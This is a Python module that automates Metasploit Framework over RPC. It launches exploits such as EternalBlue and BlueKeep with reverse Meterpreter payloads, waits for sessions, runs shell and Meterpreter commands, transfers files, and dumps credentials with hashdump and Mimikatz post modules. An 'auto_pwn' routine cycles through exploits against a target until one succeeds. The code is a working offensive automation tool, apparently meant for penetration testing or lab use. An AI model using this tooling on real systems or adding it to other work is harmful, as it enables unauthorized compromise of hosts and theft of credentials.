"""
Enhanced Metasploit RPC Integration

Provides full integration with Metasploit Framework via RPC:
- Automatic module execution
- Session management and interaction  
- Meterpreter command execution
- Post-exploitation automation
- Credential harvesting

Requirements:
    pip install msgpack requests

Setup:
    # Start msfrpcd
    msfrpcd -P yourpassword -S -a 127.0.0.1 -p 55553
    
    # Or via msfconsole
    load msgrpc Pass=yourpassword Port=55553

Usage:
    msf = MetasploitManager(password="yourpassword")
    
    if msf.connect():
        # Run exploit
        job = msf.run_exploit(
            "exploit/windows/smb/ms17_010_eternalblue",
            rhosts="10.10.10.40",
            lhost="10.10.14.1"
        )
        
        # Check for sessions
        sessions = msf.get_sessions()
        if sessions:
            # Interact with session
            output = msf.run_meterpreter_command(1, "getuid")
"""

import json
import logging
import time
import threading
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Dict, List, Any, Optional, Callable
from queue import Queue

logger = logging.getLogger(__name__)

# Optional imports
try:
    import msgpack
    import requests
    DEPENDENCIES_AVAILABLE = True
except ImportError:
    DEPENDENCIES_AVAILABLE = False
    logger.warning("[MSF-RPC] msgpack or requests not installed")


class JobStatus(Enum):
    """Metasploit job status"""
    RUNNING = "running"
    COMPLETED = "completed"
    FAILED = "failed"
    STOPPED = "stopped"


@dataclass
class ExploitJob:
    """Represents a running exploit job"""
    job_id: int
    module: str
    target: str
    status: JobStatus = JobStatus.RUNNING
    session_id: Optional[int] = None
    started_at: str = ""
    completed_at: str = ""
    error: str = ""
    
    def __post_init__(self):
        if not self.started_at:
            self.started_at = datetime.now().isoformat()


@dataclass
class MeterpreterSession:
    """Enhanced Meterpreter session wrapper"""
    session_id: int
    session_type: str
    target_host: str
    target_port: int
    via_exploit: str
    platform: str
    arch: str
    info: str = ""
    username: str = ""
    computer_name: str = ""
    is_admin: bool = False
    established_at: str = ""
    
    def __post_init__(self):
        if not self.established_at:
            self.established_at = datetime.now().isoformat()
    
    def to_dict(self) -> Dict:
        return {
            "session_id": self.session_id,
            "type": self.session_type,
            "target": f"{self.target_host}:{self.target_port}",
            "exploit": self.via_exploit,
            "platform": self.platform,
            "arch": self.arch,
            "username": self.username,
            "is_admin": self.is_admin,
        }


class MetasploitManager:
    """
    High-level Metasploit Framework manager.
    
    Provides:
    - Exploit execution with automatic payload selection
    - Session management and interaction
    - Post-exploitation automation
    - Credential harvesting
    
    Usage:
        msf = MetasploitManager(password="msf123")
        
        if msf.connect():
            # Run EternalBlue
            job = msf.run_exploit(
                "exploit/windows/smb/ms17_010_eternalblue",
                rhosts="10.10.10.40",
                payload="windows/x64/meterpreter/reverse_tcp",
                lhost="10.10.14.1",
                lport=4444
            )
            
            # Wait for session
            session = msf.wait_for_session(timeout=60)
            
            if session:
                # Get system info
                info = msf.run_meterpreter_command(session.session_id, "sysinfo")
                
                # Dump hashes
                hashes = msf.run_post_module(
                    session.session_id,
                    "post/windows/gather/hashdump"
                )
    """
    
    def __init__(
        self,
        password: str,
        host: str = "127.0.0.1",
        port: int = 55553,
        ssl: bool = True
    ):
        self.password = password
        self.host = host
        self.port = port
        self.ssl = ssl
        self.token: Optional[str] = None
        self.uri = f"{'https' if ssl else 'http'}://{host}:{port}/api/"
        
        # State tracking
        self.jobs: Dict[int, ExploitJob] = {}
        self.sessions: Dict[int, MeterpreterSession] = {}
        
        # Session callbacks
        self.session_callbacks: List[Callable] = []
        
        # Background session monitor
        self._monitor_thread: Optional[threading.Thread] = None
        self._stop_monitor = threading.Event()
        
        if not DEPENDENCIES_AVAILABLE:
            logger.error("[MSF-Manager] Required packages not installed: pip install msgpack requests")
    
    def _call(self, method: str, *args) -> Optional[Dict]:
        """Make RPC call to Metasploit"""
        if not DEPENDENCIES_AVAILABLE:
            return None
        
        try:
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            
            if self.token:
                params = [method, self.token] + list(args)
            else:
                params = [method] + list(args)
            
            data = msgpack.packb(params)
            
            response = requests.post(
                self.uri,
                data=data,
                headers={"Content-Type": "binary/message-pack"},
                verify=False,
                timeout=30
            )
            
            if response.status_code == 200:
                return msgpack.unpackb(response.content, raw=False)
            else:
                logger.error(f"[MSF-RPC] HTTP {response.status_code}")
                
        except requests.exceptions.ConnectionError:
            logger.debug("[MSF-RPC] Connection failed")
        except Exception as e:
            logger.error(f"[MSF-RPC] Error: {e}")
        
        return None
    
    def connect(self) -> bool:
        """Connect and authenticate with Metasploit RPC"""
        if not DEPENDENCIES_AVAILABLE:
            logger.error("[MSF-Manager] Cannot connect: missing dependencies")
            return False
        
        result = self._call("auth.login", "msf", self.password)
        
        if result and result.get("result") == "success":
            self.token = result.get("token")
            logger.info("[MSF-Manager] Connected to Metasploit")
            
            # Start session monitor
            self._start_session_monitor()
            
            return True
        
        logger.error("[MSF-Manager] Authentication failed")
        return False
    
    def disconnect(self):
        """Disconnect from Metasploit"""
        self._stop_monitor.set()
        if self._monitor_thread:
            self._monitor_thread.join(timeout=5)
        
        if self.token:
            self._call("auth.logout", self.token)
            self.token = None
            logger.info("[MSF-Manager] Disconnected")
    
    def is_connected(self) -> bool:
        """Check if connected"""
        if not self.token:
            return False
        
        result = self._call("core.version")
        return result is not None
    
    def get_version(self) -> Optional[str]:
        """Get Metasploit version"""
        result = self._call("core.version")
        if result:
            return f"Metasploit {result.get('version', 'unknown')}"
        return None
    
    # =========================================================================
    # Exploit Execution
    # =========================================================================
    
    def run_exploit(
        self,
        module: str,
        rhosts: str,
        payload: str = None,
        lhost: str = None,
        lport: int = 4444,
        target: int = 0,
        **options
    ) -> Optional[ExploitJob]:
        """
        Run an exploit module.
        
        Args:
            module: Full module path (e.g., exploit/windows/smb/ms17_010_eternalblue)
            rhosts: Target host(s)
            payload: Payload to use (auto-selected if None)
            lhost: Local host for reverse connections
            lport: Local port for reverse connections
            target: Target index (default 0)
            **options: Additional module options
            
        Returns:
            ExploitJob or None if failed
        """
        # Build options
        opts = {
            "RHOSTS": rhosts,
            "LPORT": lport,
            "TARGET": target,
        }
        
        if lhost:
            opts["LHOST"] = lhost
        
        if payload:
            opts["PAYLOAD"] = payload
        
        opts.update({k.upper(): v for k, v in options.items()})
        
        # Extract module type and name
        parts = module.split("/")
        module_type = parts[0]
        module_name = "/".join(parts[1:])
        
        # Execute
        result = self._call("module.execute", module_type, module_name, opts)
        
        if result:
            if "job_id" in result:
                job = ExploitJob(
                    job_id=result["job_id"],
                    module=module,
                    target=rhosts,
                )
                self.jobs[job.job_id] = job
                logger.info(f"[MSF-Manager] Started job {job.job_id}: {module}")
                return job
            
            elif "error" in result:
                logger.error(f"[MSF-Manager] Exploit error: {result['error']}")
        
        return None
    
    def run_auxiliary(
        self,
        module: str,
        rhosts: str,
        **options
    ) -> Optional[Dict]:
        """Run an auxiliary module"""
        opts = {"RHOSTS": rhosts}
        opts.update({k.upper(): v for k, v in options.items()})
        
        parts = module.split("/")
        module_name = "/".join(parts[1:]) if parts[0] == "auxiliary" else module
        
        result = self._call("module.execute", "auxiliary", module_name, opts)
        return result
    
    def get_job_status(self, job_id: int) -> Optional[JobStatus]:
        """Get status of a job"""
        result = self._call("job.list")
        
        if result:
            if str(job_id) in result:
                return JobStatus.RUNNING
            else:
                # Job finished - check if we got a session
                job = self.jobs.get(job_id)
                if job:
                    job.status = JobStatus.COMPLETED
                    job.completed_at = datetime.now().isoformat()
                return JobStatus.COMPLETED
        
        return None
    
    def stop_job(self, job_id: int) -> bool:
        """Stop a running job"""
        result = self._call("job.stop", job_id)
        if result:
            job = self.jobs.get(job_id)
            if job:
                job.status = JobStatus.STOPPED
            return True
        return False
    
    # =========================================================================
    # Session Management
    # =========================================================================
    
    def get_sessions(self) -> Dict[int, MeterpreterSession]:
        """Get all active sessions"""
        result = self._call("session.list")
        
        if result:
            for sid, info in result.items():
                sid = int(sid)
                if sid not in self.sessions:
                    session = MeterpreterSession(
                        session_id=sid,
                        session_type=info.get("type", "shell"),
                        target_host=info.get("tunnel_peer", "").split(":")[0],
                        target_port=int(info.get("tunnel_peer", "0:0").split(":")[-1]),
                        via_exploit=info.get("via_exploit", ""),
                        platform=info.get("platform", ""),
                        arch=info.get("arch", ""),
                        info=info.get("info", ""),
                    )
                    self.sessions[sid] = session
                    
                    # Trigger callbacks
                    for callback in self.session_callbacks:
                        try:
                            callback(session)
                        except:
                            pass
        
        return self.sessions
    
    def wait_for_session(
        self,
        timeout: int = 60,
        check_interval: float = 2.0
    ) -> Optional[MeterpreterSession]:
        """
        Wait for a new session to be established.
        
        Args:
            timeout: Maximum time to wait in seconds
            check_interval: How often to check for sessions
            
        Returns:
            New session or None if timeout
        """
        initial_sessions = set(self.sessions.keys())
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            self.get_sessions()
            
            new_sessions = set(self.sessions.keys()) - initial_sessions
            if new_sessions:
                session_id = list(new_sessions)[0]
                return self.sessions[session_id]
            
            time.sleep(check_interval)
        
        return None
    
    def on_session(self, callback: Callable):
        """Register callback for new sessions"""
        self.session_callbacks.append(callback)
    
    def _start_session_monitor(self):
        """Start background session monitoring"""
        def monitor():
            while not self._stop_monitor.is_set():
                try:
                    self.get_sessions()
                except:
                    pass
                time.sleep(5)
        
        self._monitor_thread = threading.Thread(target=monitor, daemon=True)
        self._monitor_thread.start()
    
    # =========================================================================
    # Meterpreter Interaction
    # =========================================================================
    
    def run_meterpreter_command(
        self,
        session_id: int,
        command: str,
        timeout: int = 30
    ) -> Optional[str]:
        """
        Run a Meterpreter command.
        
        Args:
            session_id: Session ID
            command: Command to run (e.g., "getuid", "sysinfo")
            timeout: Command timeout
            
        Returns:
            Command output or None
        """
        # Write command
        result = self._call("session.meterpreter_run_single", session_id, command)
        
        if result and "error" not in result:
            # Read output
            time.sleep(0.5)
            
            output = ""
            start_time = time.time()
            
            while time.time() - start_time < timeout:
                read_result = self._call("session.meterpreter_read", session_id)
                if read_result and "data" in read_result:
                    output += read_result["data"]
                    if output.strip():
                        break
                time.sleep(0.5)
            
            return output.strip() if output else None
        
        return None
    
    def run_shell_command(
        self,
        session_id: int,
        command: str,
        timeout: int = 30
    ) -> Optional[str]:
        """Run a shell command in a session"""
        # Write command
        result = self._call("session.shell_write", session_id, command + "\n")
        
        if result and result.get("write_count", 0) > 0:
            time.sleep(1)
            
            # Read output
            read_result = self._call("session.shell_read", session_id)
            if read_result and "data" in read_result:
                return read_result["data"]
        
        return None
    
    def upload_file(
        self,
        session_id: int,
        local_path: str,
        remote_path: str
    ) -> bool:
        """Upload a file to target via Meterpreter"""
        command = f"upload {local_path} {remote_path}"
        result = self.run_meterpreter_command(session_id, command)
        return result is not None and "uploaded" in (result or "").lower()
    
    def download_file(
        self,
        session_id: int,
        remote_path: str,
        local_path: str
    ) -> bool:
        """Download a file from target via Meterpreter"""
        command = f"download {remote_path} {local_path}"
        result = self.run_meterpreter_command(session_id, command)
        return result is not None and "downloaded" in (result or "").lower()
    
    # =========================================================================
    # Post-Exploitation
    # =========================================================================
    
    def run_post_module(
        self,
        session_id: int,
        module: str,
        **options
    ) -> Optional[Dict]:
        """
        Run a post-exploitation module.
        
        Args:
            session_id: Session to run against
            module: Post module path (e.g., post/windows/gather/hashdump)
            **options: Additional module options
            
        Returns:
            Module output or None
        """
        opts = {"SESSION": session_id}
        opts.update({k.upper(): v for k, v in options.items()})
        
        # Remove 'post/' prefix if present
        if module.startswith("post/"):
            module = module[5:]
        
        result = self._call("module.execute", "post", module, opts)
        return result
    
    def gather_credentials(self, session_id: int) -> List[Dict]:
        """
        Gather credentials from a session.
        
        Runs appropriate credential gathering modules based on platform.
        
        Returns:
            List of credential dictionaries
        """
        credentials = []
        session = self.sessions.get(session_id)
        
        if not session:
            return credentials
        
        # Determine platform
        platform = session.platform.lower()
        
        if "windows" in platform:
            # Windows credential modules
            modules = [
                "windows/gather/hashdump",
                "windows/gather/credentials/credential_collector",
            ]
            
            # Try Mimikatz if admin
            if session.is_admin:
                modules.append("windows/gather/credentials/mimikatz_lsa")
            
        elif "linux" in platform:
            modules = [
                "linux/gather/hashdump",
                "linux/gather/enum_configs",
            ]
        else:
            modules = []
        
        for module in modules:
            try:
                result = self.run_post_module(session_id, f"post/{module}")
                if result:
                    # Parse credentials from result
                    # This is simplified - real parsing would be more complex
                    credentials.append({
                        "module": module,
                        "result": result,
                    })
            except Exception as e:
                logger.debug(f"[MSF-Manager] Module {module} failed: {e}")
        
        return credentials
    
    def suggest_local_exploits(self, session_id: int) -> List[Dict]:
        """Run local exploit suggester"""
        result = self.run_post_module(
            session_id,
            "post/multi/recon/local_exploit_suggester"
        )
        
        if result:
            # Parse suggestions
            # Format varies, return raw for now
            return [{"raw_result": result}]
        
        return []
    
    def get_system_info(self, session_id: int) -> Optional[Dict]:
        """Get detailed system information"""
        output = self.run_meterpreter_command(session_id, "sysinfo")
        
        if output:
            info = {}
            for line in output.split("\n"):
                if ":" in line:
                    key, value = line.split(":", 1)
                    info[key.strip()] = value.strip()
            return info
        
        return None
    
    def check_admin(self, session_id: int) -> bool:
        """Check if session has admin/root privileges"""
        session = self.sessions.get(session_id)
        if not session:
            return False
        
        if "windows" in session.platform.lower():
            output = self.run_meterpreter_command(session_id, "getuid")
            if output:
                session.is_admin = "SYSTEM" in output or "Administrator" in output
                return session.is_admin
        else:
            output = self.run_meterpreter_command(session_id, "getuid")
            if output:
                session.is_admin = "uid=0" in output or "root" in output.lower()
                return session.is_admin
        
        return False
    
    # =========================================================================
    # Convenience Methods
    # =========================================================================
    
    def exploit_and_wait(
        self,
        module: str,
        rhosts: str,
        timeout: int = 120,
        **options
    ) -> Optional[MeterpreterSession]:
        """
        Run exploit and wait for session.
        
        Convenience method that combines run_exploit() and wait_for_session().
        """
        job = self.run_exploit(module, rhosts, **options)
        
        if job:
            logger.info(f"[MSF-Manager] Waiting for session (timeout: {timeout}s)")
            session = self.wait_for_session(timeout=timeout)
            
            if session:
                # Enrich session info
                self.check_admin(session.session_id)
                logger.info(f"[MSF-Manager] Session {session.session_id} established!")
                return session
            else:
                logger.warning("[MSF-Manager] No session obtained")
        
        return None
    
    def auto_pwn(
        self,
        target: str,
        os_hint: str = None,
        lhost: str = None,
        lport: int = 4444
    ) -> Optional[MeterpreterSession]:
        """
        Attempt automatic exploitation.
        
        Tries multiple exploits based on target characteristics.
        
        Args:
            target: Target IP
            os_hint: OS hint (windows, linux)
            lhost: Local host
            lport: Local port
            
        Returns:
            Session if successful
        """
        from .metasploit import get_metasploit_db
        
        db = get_metasploit_db()
        
        # Get modules to try
        if os_hint and "windows" in os_hint.lower():
            # Windows priority exploits
            modules = [
                "exploit/windows/smb/ms17_010_eternalblue",
                "exploit/windows/smb/ms08_067_netapi",
                "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
            ]
            payload = "windows/x64/meterpreter/reverse_tcp"
        elif os_hint and "linux" in os_hint.lower():
            modules = [
                "exploit/linux/samba/is_known_pipename",
                "exploit/multi/http/apache_mod_cgi_bash_env_exec",
            ]
            payload = "linux/x64/meterpreter/reverse_tcp"
        else:
            # Try common modules
            modules = [m.full_name for m in db.get_exploit_modules()[:10]]
            payload = None
        
        for module in modules:
            logger.info(f"[MSF-Manager] Trying: {module}")
            
            session = self.exploit_and_wait(
                module=module,
                rhosts=target,
                payload=payload,
                lhost=lhost,
                lport=lport,
                timeout=60
            )
            
            if session:
                return session
        
        return None
    
    def get_stats(self) -> Dict[str, Any]:
        """Get manager statistics"""
        return {
            "connected": self.is_connected(),
            "version": self.get_version(),
            "active_jobs": len([j for j in self.jobs.values() if j.status == JobStatus.RUNNING]),
            "total_jobs": len(self.jobs),
            "active_sessions": len(self.sessions),
        }


# Singleton
_msf_manager: Optional[MetasploitManager] = None


def get_metasploit_manager(password: str = None, **kwargs) -> Optional[MetasploitManager]:
    """Get or create MetasploitManager instance"""
    global _msf_manager
    
    if _msf_manager is None and password:
        _msf_manager = MetasploitManager(password, **kwargs)
    
    return _msf_manager
